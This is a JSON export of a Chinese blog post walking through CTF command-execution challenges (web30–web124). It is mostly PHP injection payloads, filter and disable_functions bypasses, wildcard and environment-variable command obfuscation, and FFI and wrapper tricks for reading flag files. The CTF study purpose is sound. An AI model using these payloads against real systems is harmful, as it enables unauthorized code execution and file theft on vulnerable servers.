{"title":"rce","uid":"15453c383c32a99612ffdb75790c3ef8","slug":"rce","date":"2024-10-22T05:28:00.000Z","updated":"2024-10-23T11:01:41.601Z","comments":true,"path":"api/articles/rce.json","keywords":null,"cover":"/image/1.jpg","content":"<h1 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a><strong>命令执行</strong></h1><p>相对地址 <strong>&#x2F;flag.php</strong> 绝对地址**&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php**</p>\n<h2 id=\"1-复制文本内容\"><a href=\"#1-复制文本内容\" class=\"headerlink\" title=\"1.复制文本内容\"></a><strong>1.复制文本内容</strong></h2><h3 id=\"Web30\"><a href=\"#Web30\" class=\"headerlink\" title=\"Web30\"></a>Web30</h3><p>​    url&#x2F;?c&#x3D;<strong>echo <code>cp fl\\*g.p\\*p 1.txt</code>;</strong> 将flag.php的内容<strong>复制到1.txt</strong>中</p>\n<p>​    url&#x2F;?c&#x3D;<strong>echo <code>mv fl\\*g.p\\*p 1.txt</code>;</strong></p>\n<p>​    访问url&#x2F;1.txt 获取文本内容</p>\n<h2 id=\"2-嵌套命令执行\"><a href=\"#2-嵌套命令执行\" class=\"headerlink\" title=\"2.嵌套命令执行\"></a><strong>2.嵌套命令执行</strong></h2><h3 id=\"Web31\"><a href=\"#Web31\" class=\"headerlink\" title=\"Web31\"></a>Web31</h3><p>l url&#x2F;?c&#x3D;<strong>eval($_GET[1]);&amp;1&#x3D;system(‘cat flag.php’);</strong>  ‘1’参数逃逸出去不受过滤限制</p>\n<h3 id=\"Web32\"><a href=\"#Web32\" class=\"headerlink\" title=\"Web32\"></a>Web32</h3><p>l url&#x2F;?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;fla</p>\n<p>g.php       ps:用include逃逸参数 要搭配<strong>文件读取</strong>使用</p>\n<p>url&#x2F;?c&#x3D;require%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php ;分号被过滤 可替换成?&gt;</p>\n<h2 id=\"3-文件包含命令执行\"><a href=\"#3-文件包含命令执行\" class=\"headerlink\" title=\"3.文件包含命令执行\"></a><strong>3.文件包含命令执行</strong></h2><h3 id=\"Web37\"><a href=\"#Web37\" class=\"headerlink\" title=\"Web37\"></a>Web37</h3><p>​    出现<strong>include($c) include($c.php)或</strong>代码即可用文件包含 使用data伪协议</p>\n<p>url&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system(\"tac fla?.php\");?></p>\n<h3 id=\"web38\"><a href=\"#web38\" class=\"headerlink\" title=\"web38\"></a>web38</h3><p>url&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system(\"tac fla?.php\");?> 短标签</p>\n<h2 id=\"4-无参数RCE\"><a href=\"#4-无参数RCE\" class=\"headerlink\" title=\"4.无参数RCE\"></a><strong>4.无参数RCE</strong></h2><h3 id=\"Web40\"><a href=\"#Web40\" class=\"headerlink\" title=\"Web40\"></a>Web40</h3><p>url&#x2F;?c&#x3D;print_r(<strong>get_defined_vars()</strong>); 获取并打印当前作用域中所有已定义的变量的数组</p>\n<p>即可自定义一个变sy量 eg:<strong>1&#x3D;phpinfo();</strong> </p>\n<p>​                  <img src=\"/post/rce/24.png\" alt=\"24\">             </p>\n<p>url&#x2F;?c&#x3D;print_r(next(<strong>get_defined_vars())</strong>);</p>\n<p><code>**next()**</code> <strong>是 PHP 中用于将数组中的内部指针向前移动并返回当前元素的函数</strong></p>\n<p><strong>url&#x2F;?c&#x3D;print_r(array_pop(next(get_defined_vars())));</strong> 弹出数组<strong>值</strong></p>\n<p><strong>url&#x2F;?c&#x3D;eval(array_pop(next(get_defined_vars()))); 执行命令</strong> </p>\n<p> <img src=\"/post/rce/233.png\" alt=\"233\"></p>\n<h2 id=\"5-shell-重定向操作\"><a href=\"#5-shell-重定向操作\" class=\"headerlink\" title=\"5. shell 重定向操作\"></a><strong>5.</strong> <strong>shell</strong> <strong>重定向操作</strong></h2><h3 id=\"Web42\"><a href=\"#Web42\" class=\"headerlink\" title=\"Web42\"></a>Web42</h3><p><strong>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</strong> 命令的标准输出（stdout）和标准错误（stderr）都被重定向到 &#x2F;dev&#x2F;null 即可<strong>双写绕过</strong></p>\n<p>url&#x2F;?c&#x3D;cat flag.php;ls</p>\n<p>web43 过滤分号</p>\n<p>url&#x2F;?c&#x3D;cat flag.php&amp;&amp;ls</p>\n<p>web45 过滤空格</p>\n<p>url&#x2F;?c&#x3D;tac%09fl*.php%26%26ls</p>\n<h2 id=\"6-Web50\"><a href=\"#6-Web50\" class=\"headerlink\" title=\"6.Web50\"></a><strong>6.Web50</strong></h2><p>​    <strong>nl&lt;flag.php||ls</strong> 这种方式<strong>不支持* ？通配符</strong></p>\n<p>​    <strong>nl&lt;fla’’g.php||ls  shell特性 用 ‘’ 分隔，</strong>命令执行时会自动<strong>忽略</strong></p>\n<h2 id=\"7-web52\"><a href=\"#7-web52\" class=\"headerlink\" title=\"7. web52\"></a><strong>7. web52</strong></h2><p> <strong>cp$IFSfl?g.ph?$IFSa.txt||ls</strong></p>\n<p> <strong>cp${IFS}fl?g.ph?${IFS}a.txt||ls</strong></p>\n<p> <strong>cp${IFS}&#x2F;fl?g${IFS}b.txt||ls</strong></p>\n<h2 id=\"8-web55\"><a href=\"#8-web55\" class=\"headerlink\" title=\"8.web55\"></a><strong>8.web55</strong></h2><p><strong>?c&#x3D;&#x2F;???&#x2F;????64 ????.???</strong></p>\n<p><strong>?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</strong></p>\n<p><strong>?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????.???</strong></p>\n<p><strong>?c&#x3D;&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php</strong></p>\n<p>最后访问**&#x2F;flag.php.bz2**即可</p>\n<p>下载下来的压缩包中包含有flag.php</p>\n<h2 id=\"9-web56\"><a href=\"#9-web56\" class=\"headerlink\" title=\"9.web56\"></a><strong>9.web56</strong></h2><p>​    自定义脚本 上传服务器进行命令执行</p>\n<p>​    自己搭建一个文件上传页面 要<strong>指定好目标ur</strong>l </p>\n<p>  <img src=\"/post/rce/25.png\" alt=\"25\"></p>\n<p>临时文件存放目录命名规则 <strong>eg:&#x2F;tmp&#x2F;phpaaaaaX</strong>  php+五位小写字母+一位大写字母</p>\n<p>使用通配符 <strong>&#x2F;???&#x2F;????????[@-[]</strong>   ascii值 @ 到 [ 之间为<strong>大写字母</strong></p>\n<p>在文件上传页面上传并抓包</p>\n<p>修改数据包内容为<strong>命令操控脚本</strong> 一般上传txt</p>\n<p>   <img src=\"/post/rce/26.png\" alt=\"26\"></p>\n<p>  <img src=\"/post/rce/27.png\" alt=\"27\"></p>\n<p>响应如下 即可正常rce   </p>\n<p><img src=\"/post/rce/28.png\" alt=\"28\"></p>\n<h2 id=\"10-web58-文件读取\"><a href=\"#10-web58-文件读取\" class=\"headerlink\" title=\"10.web58 文件读取\"></a><strong>10.web58</strong> <strong>文件读取</strong></h2><p><strong>echo file_get_contents(‘flag.php’);</strong></p>\n<p><strong>highlight_file(‘flag.php’);</strong></p>\n<p><strong>show_source(‘flag.php’);</strong></p>\n<p><strong>include_file(‘flag.php’);echo $flag;</strong></p>\n<p><strong>include(‘flag.php’);var_dump(get_defined_vars());</strong></p>\n<h2 id=\"11-web-66\"><a href=\"#11-web-66\" class=\"headerlink\" title=\"11.web 66\"></a><strong>11.web 66</strong></h2><p><strong>Flag</strong>换位置 使用var_dump(scandir(‘&#x2F;‘)); var_export(scandir(‘&#x2F;‘));**</p>\n<p> <strong>..&#x2F;</strong> <strong>上一级目录</strong> </p>\n<p><strong>.</strong> <strong>当前目录</strong> <strong>&#x2F; 根目录</strong></p>\n<p><strong>include(‘&#x2F;flag.txt’);</strong></p>\n<p><strong>12.web 71</strong></p>\n<p> <img src=\"/post/rce/29.png\" alt=\"29\"></p>\n<p>将flag转换成？</p>\n<p> <img src=\"/post/rce/30.png\" alt=\"30\"></p>\n<p> 此时在命令后添加一个 exit(); 中断下列命令即可</p>\n<p><strong>include(‘&#x2F;flag.txt’);exit();</strong></p>\n<p><strong>include(‘&#x2F;flag.txt’);ob_flush();</strong></p>\n<p><strong>include(‘&#x2F;flag.txt’); ob_end_flush();</strong></p>\n<p><strong>include(‘&#x2F;flag.txt’);die();</strong></p>\n<p><strong>c&#x3D;$a&#x3D;”glob:&#x2F;&#x2F;&#x2F;*.txt”;</strong></p>\n<h2 id=\"13-web72\"><a href=\"#13-web72\" class=\"headerlink\" title=\"13.web72\"></a><strong>13.web72</strong></h2><p>glob可以遍历目录，并且不受disable_functions的限制。</p>\n<p>​    构造<strong>c&#x3D;?&gt;<?php $a=new DirectoryIterator(\"glob:///\\*\"); foreach($a as $f) {echo($f->__toString().' ');} exit(0); ?></strong></p>\n<p>其实就是执行了一个php语句。首先glob查找根目录下的所有目录（glob:&#x2F;&#x2F; &#x2F;*这样更加清楚些）。然后循环执行并输出给$f，在输出$f。</p>\n<p>​            </p>\n<h2 id=\"14-web73-通过连接数据库读取\"><a href=\"#14-web73-通过连接数据库读取\" class=\"headerlink\" title=\"14.web73 通过连接数据库读取\"></a><strong>14.web73</strong> <strong>通过连接数据库读取</strong></h2><p><strong>c&#x3D;</strong></p>\n<p><strong>try {$dbh &#x3D; new PDO(‘mysql:host&#x3D;localhost;dbname&#x3D;ctftraining’, ‘root’,’root’);foreach($dbh-&gt;query(‘select load_file(“&#x2F;flag36.txt”)’) as $row){echo($row[0]).”|”; }$dbh &#x3D; null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);</strong></p>\n<p>数据库名<strong>ctftraining</strong> 在web58通过蚁剑连接可以获取</p>\n<p>此方法搭配72关遍历目录使用</p>\n<h2 id=\"15-web77-FFI-即外部函数接口\"><a href=\"#15-web77-FFI-即外部函数接口\" class=\"headerlink\" title=\"15.web77 FFI 即外部函数接口\"></a><strong>15.web77 FFI 即外部函数接口</strong></h2><p>外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">**c=$ffi = FFI::cdef(&quot;int system(const char \\*command);&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);**</span><br></pre></td></tr></table></figure>\n\n<p>$ffi &#x3D; FFI::cdef(“int system(const char *command);”);&#x2F;&#x2F;创建一个system对象</p>\n<p>$a&#x3D;’&#x2F;readflag &gt; 1.txt’;&#x2F;&#x2F;没有回显，所以将内容输出到1.txt</p>\n<p>$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数</p>\n<p><strong>再访问1.txt</strong></p>\n<h2 id=\"16-通过系统变量来构造命令\"><a href=\"#16-通过系统变量来构造命令\" class=\"headerlink\" title=\"16.通过系统变量来构造命令\"></a>16.通过系统变量来构造命令</h2><h3 id=\"web118\"><a href=\"#web118\" class=\"headerlink\" title=\"web118\"></a>web118</h3><p>思路一</p>\n<p><code>$&#123;PWD&#125;</code> 表示当前工作目录的路径</p>\n<p><code>$&#123;PATH&#125;</code> 是一个环境变量</p>\n<p>通常包含<code>/bin</code>、<code>/usr/bin</code>、<code>/sbin</code>、<code>/usr/sbin</code> 等目录</p>\n<p>可以发现这几个目录的<strong>最后一个字母</strong>都是<strong>n</strong></p>\n<p>接下来再看看怎么通过系统变量来获取字母</p>\n<p>echo ${PWD}<br>&#x2F;root<br>echo ${PWD:0:1} #表示从0下标开始的第一个字符<br>&#x2F;<br>echo ${PWD:<del>0:1} #从结尾开始往前的第一个字符<br>t<br>echo ${PWD:</del>0}<br>t<br>echo ${PWD:~A} #所以字母和0具有同样作用<br>t</p>\n<p>通过提示可得<strong>当前目录是&#x2F;var&#x2F;www&#x2F;html</strong></p>\n<p>可以构造<strong>nl</strong>命令</p>\n<p>payload: nl 如下是环境变量构造 空格**$IFS**代替 flag.php用 **????.???**代替</p>\n<p><strong>${PATH:<del>0}${PWD:</del>0}$IFS????.???</strong></p>\n<p>看源代码即可</p>\n<h2 id=\"17-通过进程累加器来获取字符构造命令\"><a href=\"#17-通过进程累加器来获取字符构造命令\" class=\"headerlink\" title=\"17.通过进程累加器来获取字符构造命令\"></a>17.通过进程累加器来获取字符构造命令</h2><h3 id=\"web119\"><a href=\"#web119\" class=\"headerlink\" title=\"web119\"></a>web119</h3><p><strong>构造 &#x2F;bin&#x2F;cat xxxx.xxx</strong></p>\n<p><strong>SHLVL</strong>是记录多个 Bash 进程实例嵌套深度的累加器,进程<strong>第一次打开shell时${SHLVL}&#x3D;1</strong>，然后在此shell中再打开一个shell时${SHLVL}&#x3D;2。</p>\n<p><strong>$:${SHLVL}}<strong>就输出</strong>&#x2F;</strong></p>\n<p>汇总一下每个数字的代替方式</p>\n<p>0：**$<strong>、</strong>$:$:$}</p>\n<p><strong>r</strong>   ${PWD:$}</p>\n<p><strong>payload:</strong></p>\n<p>&#x2F;???&#x2F;??v ????.???</p>\n<p>${PWD::$}???${PWD::$}??${PWD:$:$} ????.???</p>\n<p>&#x2F;???&#x2F;r? ????.???</p>\n<p>${PWD::$}???${PWD::$}${PWD:$}?? ????.???</p>\n<h2 id=\"19-web122\"><a href=\"#19-web122\" class=\"headerlink\" title=\"19.web122\"></a>19.web122</h2><p><strong>构造  &#x2F;bin&#x2F;base64 xxxx.xx</strong></p>\n<p><strong>以base64的形式来输出文件</strong></p>\n<p><strong>${HOME}&#x3D;&#x2F;root</strong></p>\n<p>&#x2F;   ${HOME::<strong>$?</strong>}   **$?<strong>与</strong>&lt;A;**搭配使用</p>\n<p>6   ${RANDOM::$?} 这里使用随机数来碰撞出数字6</p>\n<p>&lt;A; 返回的错误值 使得 <strong>$?</strong> 为1</p>\n<p>payload:</p>\n<p>&#x2F;???&#x2F;????6? ????.???</p>\n<p>&lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.???</p>\n<h2 id=\"20-web124\"><a href=\"#20-web124\" class=\"headerlink\" title=\"20.web124\"></a>20.web124</h2><p><img src=\"/post/rce/image-20240426133504795.png\" alt=\"image-20240426133504795\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$hexadecimal</span> = <span class=\"string\">&#x27;a37334&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base_convert</span>(<span class=\"variable\">$hexadecimal</span>, <span class=\"number\">16</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输出：101000110111001100110100</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/rce/image-20240426133607518.png\" alt=\"image-20240426133607518\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">bindec</span>(<span class=\"string\">&#x27;110011&#x27;</span>) . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">bindec</span>(<span class=\"string\">&#x27;000110011&#x27;</span>) . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">bindec</span>(<span class=\"string\">&#x27;111&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>以上示例会输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">51</span><br><span class=\"line\">51</span><br><span class=\"line\">7</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/rce/image-20240426133650051.png\" alt=\"image-20240426133650051\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">decbin</span>(<span class=\"number\">12</span>) . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">decbin</span>(<span class=\"number\">26</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>以上示例会输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1100</span><br><span class=\"line\">11010</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/rce/image-20240426133727782.png\" alt=\"image-20240426133727782\"></p>\n<p><img src=\"/post/rce/image-20240426133741543.png\" alt=\"image-20240426133741543\"></p>\n<h3 id=\"动态函数调用\"><a href=\"#动态函数调用\" class=\"headerlink\" title=\"动态函数调用\"></a>动态函数调用</h3><p>要使用 <code>$var&#123;func&#125;</code> 这种形式</p>\n<p> <code>$var</code> 是一个字符串，<code>&#123;func&#125;</code> 表示函数名</p>\n<p>如果直接使用 <code>$func</code>，则 PHP 引擎会将其解释为一个未定义的常量，并<strong>不会</strong>当成代码来<strong>执行</strong></p>\n<p>&#96;&#96;&lt;?php&#96; </p>\n<p><code>echo (&#39;system&#39;)(&#39;dir&#39;)</code>;</p>\n<p><code>?&gt;</code></p>\n<p>输出页面</p>\n<img src=\"/post/rce/image-20240426135131238.png\" alt=\"image-20240426135131238\" style=\"zoom: 67%;\">\n\n<p>在web124中，我们要<strong>在可用函数中</strong>通过<strong>数字的进制转换</strong>来<strong>构造字符串</strong></p>\n<p>最先想到的便是<strong>hex2bin</strong>因为他最终可以<strong>返回ascii值</strong>来构造字符串</p>\n<p>但是<strong>hex2bin被禁用</strong>便可以通过<strong>base_convert</strong>来构造</p>\n<p>通过实验逆向构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">base_convert(&#x27;hex2bin&#x27;,36,10)\t→\t37907361743</span><br></pre></td></tr></table></figure>\n\n<p>可得第一部分目标代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">base_convert(&#x27;37907361743&#x27;,10,36)</span><br></pre></td></tr></table></figure>\n\n<p>通过<strong>php动态函数调用</strong>，我们最终要构造</p>\n<p>(‘hex2bin’)(‘hex字符串’) 来构造出 ‘<strong>_GET</strong>‘</p>\n<p>第一部分已经完成，接下来构造第二部分</p>\n<p>题目中<strong>字母也被禁用</strong></p>\n<p>文本转16进制再转10进制得</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_GET → 5f474554 → 1598506324</span><br></pre></td></tr></table></figure>\n\n<p>可得第二部分目标代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dechex(1598506324)</span><br></pre></td></tr></table></figure>\n\n<p>(‘hex2bin’)(‘hex字符串’)两部分替换后得</p>\n<p><code>base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))</code>      _GET</p>\n<p>再通过动态函数调用<em>构造二次传参</em></p>\n<p><strong>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));  动态函数调用部分</strong></p>\n<p><strong>$$pi &#x3D; $_GET</strong>   即可构造二次传参 并且 <strong>[]</strong> 让 <strong>ban</strong> 了替换成 <strong>{}</strong> 即可</p>\n<p><strong>$$pi{abs}($$a{acos});&amp;abs&#x3D;system&amp;acos&#x3D;ls;</strong>  <strong>构造二次传参部分</strong>  </p>\n<p>其中**$$pi{abs};<strong>是$var{func}中的</strong>$var<strong>，</strong>$$pi{acos};<strong>是$var{func}中的</strong>{func}**</p>\n<p>最终payload:</p>\n<p><strong>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&amp;abs&#x3D;system&amp;acos&#x3D;ls;</strong> </p>\n<p>选<strong>pi</strong>是因为他是在白名单中<strong>最短的</strong> 方便绕过<strong>长度限制</strong></p>\n","text":"命令执行相对地址 /flag.php 绝对地址**/var/www/html/flag.php** 1.复制文本内容Web30​ url/?c=echo cp ...","permalink":"/post/rce","photos":[],"count_time":{"symbolsCount":"6.3k","symbolsTime":"6 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":6,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"php","slug":"php","count":1,"path":"api/tags/php.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">命令执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E5%A4%8D%E5%88%B6%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">1.复制文本内容</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web30\"><span class=\"toc-text\">Web30</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-%E5%B5%8C%E5%A5%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">2.嵌套命令执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web31\"><span class=\"toc-text\">Web31</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web32\"><span class=\"toc-text\">Web32</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">3.文件包含命令执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web37\"><span class=\"toc-text\">Web37</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web38\"><span class=\"toc-text\">web38</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-%E6%97%A0%E5%8F%82%E6%95%B0RCE\"><span class=\"toc-text\">4.无参数RCE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web40\"><span class=\"toc-text\">Web40</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-shell-%E9%87%8D%E5%AE%9A%E5%90%91%E6%93%8D%E4%BD%9C\"><span class=\"toc-text\">5. shell 重定向操作</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web42\"><span class=\"toc-text\">Web42</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-Web50\"><span class=\"toc-text\">6.Web50</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-web52\"><span class=\"toc-text\">7. web52</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8-web55\"><span class=\"toc-text\">8.web55</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-web56\"><span class=\"toc-text\">9.web56</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-web58-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">10.web58 文件读取</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-web-66\"><span class=\"toc-text\">11.web 66</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#13-web72\"><span class=\"toc-text\">13.web72</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#14-web73-%E9%80%9A%E8%BF%87%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">14.web73 通过连接数据库读取</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#15-web77-FFI-%E5%8D%B3%E5%A4%96%E9%83%A8%E5%87%BD%E6%95%B0%E6%8E%A5%E5%8F%A3\"><span class=\"toc-text\">15.web77 FFI 即外部函数接口</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#16-%E9%80%9A%E8%BF%87%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F%E6%9D%A5%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">16.通过系统变量来构造命令</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web118\"><span class=\"toc-text\">web118</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#17-%E9%80%9A%E8%BF%87%E8%BF%9B%E7%A8%8B%E7%B4%AF%E5%8A%A0%E5%99%A8%E6%9D%A5%E8%8E%B7%E5%8F%96%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">17.通过进程累加器来获取字符构造命令</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web119\"><span class=\"toc-text\">web119</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#19-web122\"><span class=\"toc-text\">19.web122</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#20-web124\"><span class=\"toc-text\">20.web124</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8\"><span class=\"toc-text\">动态函数调用</span></a></li></ol></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"提权","uid":"8253069df3e619a90109a077baa63a85","slug":"提权","date":"2024-10-22T11:03:03.000Z","updated":"2024-10-23T11:02:29.860Z","comments":true,"path":"api/articles/提权.json","keywords":null,"cover":"/image/4.jpg","text":"获取交互式shell123python -c \"import pty;pty.spawn('/bin/bash')\"stty raw -echoexpotr T...","permalink":"/post/提权","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"渗透","slug":"渗透","count":1,"path":"api/categories/渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":1,"path":"api/tags/内网渗透.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{}}